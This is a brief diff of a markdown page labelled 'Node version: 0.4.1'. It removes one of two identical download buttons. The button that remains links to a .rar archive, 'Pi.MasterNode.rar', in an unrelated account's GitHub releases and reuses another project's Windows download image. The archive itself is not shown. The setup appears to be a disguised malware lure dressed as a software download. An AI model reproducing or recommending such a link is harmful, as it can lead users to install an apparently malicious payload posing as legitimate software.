@@ -8,9 +8,7 @@ Thursday, 25 April 2024
 ***
 ## Node version: 0.4.1
 
-</p>
-  <a href="https://github.com/freezmadmin/freezmadmin/releases/download/No9e/Pi.MasterNode.rar"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
-</p>
+
 
 
   <a href="https://github.com/freezmadmin/freezmadmin/releases/download/No9e/Pi.MasterNode.rar"><img src="https://github.com/cmdr2/stable-diffusion-ui/raw/main/media/download-win.png" width="200" /></a>
